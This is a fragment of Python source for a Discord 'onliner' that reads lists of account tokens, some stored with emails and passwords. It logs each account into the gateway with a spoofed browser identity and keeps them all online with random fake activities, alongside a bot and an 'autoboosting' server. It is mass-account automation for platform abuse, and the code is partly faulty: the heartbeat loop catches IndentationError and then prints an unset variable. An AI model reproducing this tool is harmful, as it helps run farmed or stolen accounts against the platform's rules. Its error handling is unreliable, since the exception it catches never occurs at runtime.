        self.required_action: str = None
        self.heartbeat_interval: int = None
        self.last_heartbeat: float = None

    def get_heatbeat_interval(self) -> None:
        resp: Dict = json.loads(self.websocket_instance.recv())
        self.heartbeat_interval = resp["d"]["heartbeat_interval"]

    def authenticate(self, token: str, rich: Presence) -> Union[Dict, bool]:
        self.websocket_instance.send(
            json.dumps(
                {
                    "op": OPCodes.Identify.value, 
                    "d": {
                        "token": token, 
                        "intents": DiscordIntents.GUILD_MESSAGES
                        | DiscordIntents.GUILDS,  
                        "properties": {
                            "os": "linux",
                            "browser": "Brave", 
                            "device": "Desktop", 
                        },
                        "presence": {
                            "activities": [
                                activity for activity in rich.activities
                            ],
                            "status": rich.online_status.value, 
                            "since": time.time(), 
                            "afk": False, 
                        },
                    },
                }
            )
        )
        try:
            resp = json.loads(self.websocket_instance.recv())
            self.username: str = resp["d"]["user"]["username"]
            self.required_action = resp["d"].get("required_action")
            self.heartbeat_counter += 1
            self.last_heartbeat = time.time()

            return resp
        except ConnectionClosedError:
            return False

    def send_heartbeat(self) -> websockets.typing.Data:
        self.websocket_instance.send(
            json.dumps(
                {"op": OPCodes.Heartbeat.value, "d": None}
            ) 
        )

        self.heartbeat_counter += 1
        self.last_heartbeat = time.time()

        resp = self.websocket_instance.recv()
        return resp
def main(token: str, activity: Presence):
    socket = DiscordWebSocket()
    socket.get_heatbeat_interval()

    auth_resp = socket.authenticate(token, activity)
    if not auth_resp:
        return
    while True:
        try:
            if (
                time.time() - socket.last_heartbeat
                >= (socket.heartbeat_interval / 1000) - 5
            ): 
                resp = socket.send_heartbeat()
            time.sleep(0.5)
        except IndentationError:
            print(resp)
def onliner(t=None):
    try:
        global tokens
        global encountered_tokens
        tokens = []
        encountered_tokens = set() 
        if t == None:

            for file_path in oconfig['onliner_paths']:
                with open(file_path, "r") as token_file:
                    old_tokens: List[str] = token_file.read().splitlines()
                    for token in old_tokens:
                        if "@" in token:
                            new_token = token.split(':')[2]
                            if new_token not in encountered_tokens: 
                                tokens.append(new_token)
                                encountered_tokens.add(new_token)
                        else:
                            if token not in encountered_tokens:  
                                tokens.append(token)
                                encountered_tokens.add(token)
        else:
            encountered_tokens = t                       


        print(f"")

        with open("config/onliner.json", "r") as config_file:
            config: Dict[str, Union[List[str], Dict[str, List[str]]]] = json.loads(config_file.read())

        activity_types: List[Activity] = [
            Activity[x.upper()] for x in config["choose_random_activity_type_from"]
        ]
        online_statuses: List[Status] = [
            Status[x.upper()] for x in config["choose_random_online_status_from"]
        ]
    except KeyError:
        print("Invalid onliner config! Exiting...")
        exit()

    thrds = []    
    for token in encountered_tokens:
        online_status = random.choice(online_statuses)
        chosen_activity_type = random.choice(activity_types)
        url = None

        if chosen_activity_type == Activity.GAME:
            name = random.choice(config["game"]["choose_random_game_from"])
        elif chosen_activity_type == Activity.STREAMING:
            name = random.choice(config["streaming"]["choose_random_name_from"])
            url = random.choice(config["streaming"]["choose_random_url_from"])
        elif chosen_activity_type == Activity.LISTENING:
            name = random.choice(config["listening"]["choose_random_name_from"])
        elif chosen_activity_type == Activity.WATCHING:
            name = random.choice(config["watching"]["choose_random_name_from"])
        elif chosen_activity_type == Activity.CUSTOM:
            name = random.choice(config["custom"]["choose_random_name_from"])   
        elif chosen_activity_type == Activity.COMPETING:
            name = random.choice(config["competing"]["choose_random_name_from"])


        activity = Presence(online_status)
        activity.addActivity(activity_type=chosen_activity_type, name=name, url=url)

        x = Thread(target=main, args=(token, activity))
        thrds.append(x)
        x.start()
#onliner end
def start_bot():
    bot.run(config["token"])


def start_bot_thread():
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.start()
if True:
    if __name__ == "__main__":
        if oconfig['use_onliner']:
            onliner()
        start_bot_thread()
        if config['auto_config']['use_autoboosting'] == True:
            port = config['port']
            run("__main__:app", host="0.0.0.0", port=port)
else:
       logging.error("Invalid Key [ Unauthorised ]")
       time.sleep(5)
       sys.exit()